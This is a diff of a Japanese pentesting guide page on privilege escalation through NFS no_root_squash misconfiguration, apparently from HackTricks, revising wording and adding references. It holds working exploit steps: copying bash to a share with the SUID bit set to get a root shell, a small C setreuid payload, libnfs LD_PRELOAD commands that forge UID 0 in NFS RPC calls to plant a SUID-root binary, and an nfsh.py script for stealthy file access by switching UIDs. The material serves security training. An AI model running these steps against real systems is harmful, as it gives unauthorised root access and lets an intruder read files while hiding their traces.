@@ -1,16 +1,14 @@
 # NFS No Root Squash Misconfiguration による権限昇格
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## Squashing の基本情報
 
-NFS は通常（特に Linux では）、接続している client が指定した `uid` と `gid` を信頼してファイルへのアクセスを許可します（Kerberos が使用されていない場合）。ただし、server ではこの**動作を変更する**ために、いくつかの設定を行えます。
+NFS AUTH_SYS/AUTH_UNIX では、server は各 RPC request で指定された `uid` と `gid` に基づいて file-permission checks を行います。Kerberos などの他の security flavor では異なる credentials が使用され、server は permissions を確認する前に numeric credentials を map できます。<sup>[[4]](#references)[[5]](#references)</sup>
 
-- **`all_squash`**: すべてのアクセスを squash し、すべての user と group を **`nobody`**（unsigned では 65534 / signed では -2）にマッピングします。したがって、全員が `nobody` となり、user は使用されません。
-- **`root_squash`/`no_all_squash`**: これは Linux のデフォルトで、**uid 0（root）によるアクセスのみ**を squash します。したがって、任意の `UID` と `GID` は信頼されますが、`0` は `nobody` に squash されます（そのため root impersonation はできません）。
-- **``no_root_squash`**: この設定を有効にすると、root user さえ squash されません。つまり、この設定で directory を mount すると、root としてアクセスできます。
+- **`all_squash`**: すべての UID と GID を anonymous account に map します。Linux ではデフォルトで `nobody` (65534) です。`no_all_squash` は root 以外の requests に対するデフォルトです。<sup>[[4]](#references)</sup>
+- **`root_squash`**: Linux でのデフォルトであり、UID/GID 0 (root) の requests を anonymous account に map します。他の UIDs と GIDs は squash されません。<sup>[[4]](#references)</sup>
+- **`no_root_squash`**: root squashing を無効にするため、UID/GID 0 の requests は server 上で root として評価されます。<sup>[[4]](#references)</sup>
 
-**/etc/exports** ファイル内で **no_root_squash** として設定された directory を見つけた場合、client としてその directory に**アクセス**し、マシンの local **root** であるかのように、その directory **内に書き込む**ことができます。
+許可された client が、**`no_root_squash`** で設定された writable export を **`/etc/exports`** に基づいて mount できる場合、その UID/GID 0 の requests により、server の root user としてそこへ write できます。<sup>[[4]](#references)</sup>
 
 **NFS** の詳細については、以下を確認してください。
 
@@ -18,15 +16,13 @@ NFS は通常（特に Linux では）、接続している client が指定し�
 ../../network-services-pentesting/nfs-service-pentesting.md
 {{#endref}}
 
-## 権限昇格
+## Privilege Escalation
 
 ### Remote Exploit
 
 bash を使用する Option 1:
-
-- client マシンでその directory を **mount** し、**root として mounted folder 内に** **/bin/bash** binary をコピーして **SUID** 権限を付与し、**victim** マシン上でその bash binary を**実行**します。
-- NFS share 内で root になるには、server で **`no_root_squash`** が設定されている必要があります。
-- ただし、有効になっていない場合でも、binary を NFS share にコピーし、昇格させたい user として SUID permission を付与することで、別の user に権限昇格できる可能性があります。
+- 許可された client 上で、writable export を root として mount し、**`/bin/bash`** をそこへ copy して、**SUID** bit を設定します。その後、`nosuid` を使用していない victim mount から実行します。<sup>[[2]](#references)[[4]](#references)</sup>
+- upload した file を root 所有のままにするには、server が **`no_root_squash`** を使用している必要があります。root が squash される場合、別の account 用の SUID binary を作成できるのは、client がその account の numeric UID/GID で正当に作成または所有できる場合に限られます。<sup>[[4]](#references)</sup>
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -39,9 +35,9 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Option 2 using c compiled code:
-- **そのディレクトリをマウント**した client machine で、**root としてマウントされたフォルダ内にコンパイル済みの payload をコピー**し、SUID permission を悪用して、その payload に **SUID** rights を付与し、victim machine からその binary を **execute**する（ここに[ C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)があります）。
-- 先ほどと同じ restrictions
+Option 2：コンパイル済みの C code を使用：
+- 許可された client から directory を mount し、SUID permissions を悪用するコンパイル済み payload をコピーして、**SUID** bit を設定し、victim から実行する（いくつかの [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) を参照）。
+- 以前と同じ制限
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -58,18 +54,17 @@ cd <SHAREDD_FOLDER>
 ### Local Exploit
 
 > [!TIP]
-> 自分のマシンから被害者マシンへの **tunnel を作成できる場合、必要なポートを tunneling することで、Remote version を使用してこの privilege escalation を exploit できます**。\
-> 次の trick は、ファイル `/etc/exports` が **IP** を示している場合に使用します。この場合、いかなる方法でも **remote exploit を使用できず**、この **trick を abuse する**必要があります。\
-> exploit を動作させるために必要なもう1つの条件は、**`/etc/export` 内の export が** **`insecure` flag を使用していること**です。\
-> --_`/etc/export` が IP address を示している場合に、この trick が動作するかどうかは確信がありません_--
+> `tunnelling` に必要な port を転送することで、マシンから victim machine への **tunnel** を作成できる場合は、Remote version を使用してこの privilege escalation を exploit できる点に注意してください。\
+> 次の trick は、`/etc/exports` が export 先を victim の IP に制限している場合に役立ちます。remote client は mount できませんが、local technique は、許可された host にすでに mount されている share を通じて動作できます。<sup>[[2]](#references)</sup>\
+> この unprivileged libnfs method では、process が non-reserved source port を使用できるよう、**`/etc/exports`** の export に `insecure` flag を指定する必要があります。`secure` が default ですが、reserved port に bind できる process ではこの option は必要ありません。<sup>[[1]](#references)[[4]](#references)</sup>
 
 ### 基本情報
 
-このシナリオでは、local machine に mount された NFS share を exploit し、client が自身の uid/gid を指定できる NFSv3 specification の flaw を利用して、unauthorized access を可能にします。exploit では、NFS RPC calls の forging を可能にする library である [libnfs](https://github.com/sahlberg/libnfs) を使用します。<sup>[[1]](#references)</sup>
+NFSv3 AUTH_UNIX client は、各 call に effective UID、GID、および groups を含め、server は permission checks にこれらを使用します。この local technique は、[libnfs](https://github.com/sahlberg/libnfs) を通じて RPC credentials を forge することでこの model を悪用します。libnfs の preload module は、NFS context 内の UID/GID を override する機能をサポートしています。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
 #### Library のコンパイル
 
-Library のコンパイル手順は、kernel version に応じて調整が必要になる場合があります。このケースでは、fallocate syscalls が comment out されました。コンパイルプロセスでは、次の commands を実行します。
+libnfs の example では target kernel に合わせた adjustments が必要になる場合があります。ここで使用する walkthrough では、preload module を compile する前に fallocate syscalls を comment out する必要があると明記されています。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 ./bootstrap
 ./configure
@@ -78,29 +73,29 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 #### Exploitの実行
 
-このExploitでは、権限をrootに昇格させてからshellを実行する単純なCプログラム（`pwn.c`）を作成します。プログラムをコンパイルし、RPC callsでuidを偽装する`ld_nfs.so`を使用して、生成されたbinary（`a.out`）をsuid root付きでshareに配置します。
+この例では、shellを起動する小さなCヘルパーを作成し、それをshareに配置した後、NFSコンテキスト内でUID 0の`ld_nfs.so`を使用してSUID-rootにします。<sup>[[1]](#references)[[2]](#references)</sup>
 
-1. **Exploit codeをコンパイル:**
+1. **Compile the exploit code:**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-2. **uid を偽装して share 上に exploit を配置し、その権限を変更する:**
+2. **exploitをshareに配置し、UIDを偽装してその権限を変更する**。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-3. **exploit を実行して root 権限を取得する:**
+3. **root privilegesを取得するためにexploitを実行する**。<sup>[[2]](#references)</sup>
 ```bash
 /mnt/share/a.out
 #root
 ```
-### Bonus: Stealthy File Access のための NFShell
+### Bonus: NFShell による Stealthy File Access
 
-root access を取得したら、所有者を変更せずに NFS share とやり取りするため（痕跡を残さないように）、Python script（nfsh.py）を使用します。この script は、アクセス対象の file の uid に一致するよう uid を調整し、permission の問題なく share 上の file とやり取りできるようにします。<sup>[[1]](#references)</sup>
+root access を取得した後、この `nfsh.py` pattern は command を実行する前に effective UID を target file の UID に設定するため、ownership を再帰的に変更せずに access できます。<sup>[[2]](#references)</sup>
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -119,13 +114,16 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-次のように実行:
+次のように実行します:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## 参考文献
+## References
 
-- [1] [あまり知られていない NFS privesc の話](https://www.errno.fr/nfs_privesc.html)
-
+- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
+- [2] [あまり知られていない NFS privesc の話](https://www.errno.fr/nfs_privesc.html)
+- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
+- [4] [exports(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/exports.5.html)
+- [5] [RFC 1813: NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
 {{#include ../../banners/hacktricks-training.md}}
